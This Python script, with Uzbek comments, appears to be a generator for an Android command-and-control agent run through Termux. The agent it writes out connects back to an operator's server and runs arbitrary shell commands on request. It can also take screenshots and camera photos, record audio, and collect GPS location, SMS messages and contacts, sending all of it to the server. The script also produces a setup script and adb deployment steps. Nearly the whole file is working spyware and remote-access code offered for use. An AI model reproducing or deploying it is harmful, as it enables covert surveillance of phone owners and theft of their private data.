"""
Android Payload Generator
Telefon uchun agent yaratish
"""

import os
import base64
from datetime import datetime


def generate_android_agent(server_ip, server_port=9999, output_file=None):
    """Android agent generatsiya qilish"""
    
    if not output_file:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = f'mobile_agent_{timestamp}.py'
    
    # Agent template
    agent_code = f'''"""
Android Mobile Agent - Auto-generated
Server: {server_ip}:{server_port}
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

import socket
import json
import threading
import time
import os
import sys
import base64
from datetime import datetime


class MobileAgent:
    """Android C2 Agent"""
    
    def __init__(self):
        self.host = "{server_ip}"
        self.port = {server_port}
        self.socket = None
        self.running = False
        
    def connect(self):
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            
            # Send device info
            device_info = {{
                'type': 'ANDROID',
                'hostname': socket.gethostname(),
                'timestamp': datetime.now().isoformat()
            }}
            
            self.socket.send(json.dumps(device_info).encode() + b'\\n')
            print(f"[+] Connected to {{self.host}}:{{self.port}}")
            
            self.running = True
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {{e}}")
            return False
    
    def execute_command(self, cmd_data):
        """Execute command"""
        cmd_type = cmd_data.get('type')
        
        if cmd_type == 'SHELL':
            import subprocess
            result = subprocess.check_output(
                cmd_data.get('command'),
                shell=True,
                stderr=subprocess.STDOUT
            ).decode()
            return {{'status': 'success', 'output': result}}
            
        elif cmd_type == 'SCREENSHOT':
            # Screenshot using termux-api
            filepath = '/sdcard/screenshot.png'
            os.system(f'screencap -p {{filepath}}')
            
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    data = base64.b64encode(f.read()).decode()
                os.remove(filepath)
                return {{'status': 'success', 'image': data}}
            
            return {{'status': 'error', 'message': 'Screenshot failed'}}
            
        elif cmd_type == 'CAMERA_PHOTO':
            camera = cmd_data.get('camera', 'back')
            filepath = f'/sdcard/photo_{{datetime.now().strftime("%Y%m%d_%H%M%S")}}.jpg'
            
            camera_id = '0' if camera == 'back' else '1'
            os.system(f'termux-camera-photo -c {{camera_id}} {{filepath}}')
            time.sleep(2)
            
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    data = base64.b64encode(f.read()).decode()
                os.remove(filepath)
                return {{'status': 'success', 'image': data}}
            
            return {{'status': 'error', 'message': 'Camera failed'}}
            
        elif cmd_type == 'RECORD_AUDIO':
            duration = cmd_data.get('duration', 10)
            filepath = f'/sdcard/audio_{{datetime.now().strftime("%Y%m%d_%H%M%S")}}.wav'
            
            os.system(f'timeout {{duration}}s termux-microphone-record -f {{filepath}}')
            time.sleep(duration + 1)
            
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    data = base64.b64encode(f.read()).decode()
                os.remove(filepath)
                return {{'status': 'success', 'audio': data}}
            
            return {{'status': 'error', 'message': 'Recording failed'}}
            
        elif cmd_type == 'GET_GPS':
            import subprocess
            result = subprocess.check_output(
                'termux-location -p network',
                shell=True,
                timeout=10
            ).decode()
            
            location = json.loads(result)
            return {{'status': 'success', 'location': location}}
            
        elif cmd_type == 'GET_SMS':
            import subprocess
            result = subprocess.check_output(
                'termux-sms-list',
                shell=True
            ).decode()
            
            messages = json.loads(result)
            return {{'status': 'success', 'messages': messages}}
            
        elif cmd_type == 'GET_CONTACTS':
            import subprocess
            result = subprocess.check_output(
                'termux-contact-list',
                shell=True
            ).decode()
            
            contacts = json.loads(result)
            return {{'status': 'success', 'contacts': contacts}}
            
        else:
            return {{'status': 'error', 'message': f'Unknown command: {{cmd_type}}'}}
    
    def run(self):
        """Main loop"""
        while self.running:
            try:
                data = self.socket.recv(4096).decode()
                
                if data:
                    command = json.loads(data)
                    print(f"[>] {{command.get('type')}}")
                    
                    result = self.execute_command(command)
                    
                    self.socket.send(json.dumps(result).encode() + b'\\n')
                
                time.sleep(0.1)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Error: {{e}}")
                time.sleep(1)
        
        if self.socket:
            self.socket.close()


if __name__ == "__main__":
    print("="*50)
    print("🤖 Mobile C2 Agent")
    print(f"Server: {server_ip}:{server_port}")
    print("="*50)
    
    agent = MobileAgent()
    
    if agent.connect():
        print("[+] Agent running...")
        agent.run()
    else:
        print("[-] Connection failed")
'''
    
    # Save to file
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(agent_code)
    
    print(f"[+] Android agent generated: {output_file}")
    print(f"[+] Server: {server_ip}:{server_port}")
    print(f"\nTelefonga o'tkazish:")
    print(f"1. Termux o'rnating (Play Store / F-Droid)")
    print(f"2. Termux:API o'rnating")
    print(f"3. File'ni telefonga ko'chiring:")
    print(f"   adb push {output_file} /sdcard/")
    print(f"4. Termux'da ishga tushiring:")
    print(f"   cd /sdcard && python {output_file}")
    
    return output_file


def generate_termux_setup_script():
    """Termux setup script yaratish"""
    
    setup_script = '''#!/data/data/com.termux/files/usr/bin/bash

echo "=================================================="
echo "📱 Android C2 Agent Setup"
echo "=================================================="

# Update packages
echo "[1/5] Updating packages..."
pkg update -y && pkg upgrade -y

# Install Python
echo "[2/5] Installing Python..."
pkg install python -y

# Install Termux:API
echo "[3/5] Installing Termux:API..."
pkg install termux-api -y

# Setup storage
echo "[4/5] Setting up storage..."
termux-setup-storage

# Install Git (optional)
echo "[5/5] Installing Git..."
pkg install git -y

echo ""
echo "✅ Setup complete!"
echo ""
echo "Next steps:"
echo "1. Ruxsatlarni bering (Settings → Apps → Termux:API)"
echo "2. Agent file'ni telefonga ko'chiring"
echo "3. python mobile_agent.py"
echo ""
'''
    
    with open('termux_setup.sh', 'w', encoding='utf-8') as f:
        f.write(setup_script)
    
    print(f"[+] Termux setup script: termux_setup.sh")
    
    return 'termux_setup.sh'


def main():
    """Main function"""
    print("\n" + "="*60)
    print("📱 Android Payload Generator")
    print("="*60 + "\n")
    
    # Get server IP
    server_ip = input("C2 Server IP manzili: ").strip()
    if not server_ip:
        server_ip = "192.168.1.100"  # Default
    
    # Get port
    try:
        server_port = int(input("Server Port [9999]: ").strip() or "9999")
    except:
        server_port = 9999
    
    # Generate agent
    print("\n[*] Generating Android agent...")
    agent_file = generate_android_agent(server_ip, server_port)
    
    # Generate setup script
    print("\n[*] Generating Termux setup script...")
    setup_file = generate_termux_setup_script()
    
    print("\n" + "="*60)
    print("✅ Files generated!")
    print("="*60)
    print(f"\n1. Agent: {agent_file}")
    print(f"2. Setup: {setup_file}")
    print("\nTelefonga o'tkazish:")
    print("   adb push mobile_agent_*.py /sdcard/")
    print("   adb push termux_setup.sh /sdcard/")
    print("\nTermux'da:")
    print("   bash /sdcard/termux_setup.sh")
    print(f"   python /sdcard/{os.path.basename(agent_file)}")
    print("")


if __name__ == "__main__":
    main()
